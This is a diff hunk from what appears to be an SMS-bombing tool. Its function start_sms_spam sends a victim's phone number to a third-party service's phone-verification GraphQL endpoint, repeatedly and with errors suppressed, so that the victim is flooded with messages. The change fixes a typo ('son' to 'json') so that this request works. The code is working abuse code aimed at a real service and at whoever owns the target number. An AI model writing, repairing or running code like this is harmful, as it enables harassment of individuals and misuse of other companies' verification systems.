@@ -1437,7 +1437,7 @@ async def start_sms_spam(phone, cycles):
             except:
                 logger.warning("Error spam")
             try:
-                post("https://api.carsmile.com/", son={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=headers)
+                post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=headers)
             except:
                 logger.warning("Error spam")
             try:
